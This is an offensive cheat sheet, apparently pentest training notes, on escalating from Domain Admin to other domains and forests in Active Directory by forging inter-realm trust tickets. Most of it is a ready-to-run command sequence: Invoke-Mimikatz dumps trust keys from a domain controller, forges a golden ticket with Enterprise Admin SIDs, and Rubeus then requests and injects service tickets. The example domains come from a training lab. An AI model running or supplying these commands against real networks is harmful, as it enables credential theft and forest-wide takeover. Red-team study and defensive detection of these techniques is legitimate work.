# Domain Trusts - Forging Trust Tickets

🔎 View in Notion [Link](https://r3dbuck3t.notion.site/Domain-Trusts-Forging-Trust-Tickets-cad847c5afb8447cac284ae5c97ed38e)

📖 Related Article on R3d-Bucket: [Breaking Domain Trusts with Forged Trust Tickets]()

# Escalation Requirement 🚩

- Domain Admin privileges on the compromised domain machine.
- Domain Controller **Trust Key** to forge the **Inter-realm TGT tickets.**

# Escalation Vectors 🎯

- **Across Domains:** an attacker with DA privileges can hop to another domains within the forest.
- **Across Forests:** accessing another forests that have transitive 2 way trust relationship with the compromised forest.

# Tools

- **Invoke-Mimikatz**
- **Rubeus**

# Escalation Steps

1. **Dump trust keys  with Mimikatz [DA privs are required]**
    
    > **Invoke-Mimikatz -Command ‘“lsadump::trust /patch”’-ComputerName DC-Name**
    > 
    
    > **Invoke-Mimikatz -Command ‘“lsadump::trust /patch”’-ComputerName dcorp-dc**
    > 

1. **Create Inter-realm Ticket with Mimikatz**
    
    > **Invoke-Mimikatz -Command '"Kerberos::golden /user: Administrator  /domain: dollarcorp.moneycorp.local [child_domain]
    /sid: DomainAdmin_SID   /sids: Enterprise_Admin_SID   /rc4: Ticket HASH  /service:krbtgt   /target:moneycorp.local [root domain]
    /ticket: location to save the ticket"'**
    > 

1. **Request service tickets with Rubeus** 
    
    > **Rubeus.exe asktgs   /ticket: ticket Location  /service: service type [cifs/mcorpdc.moneycorp.local]  /dc: domain controller [mcorp-dc.moneycorp.local]  /ptt**
    > 
    
    # References
    
    [Enumerating Domain Trusts in Active Directory](https://medium.com/r3d-buck3t/enumerating-domain-trusts-in-active-directory-series-c85205fc862f)
    
    [](https://www.pentesteracademy.com/activedirectorylab)
    
    [From Domain Admin to Enterprise Admin](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
    
    [Specifying Security and Administrative Boundaries](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc755979(v=ws.10)?redirectedfrom=MSDN)
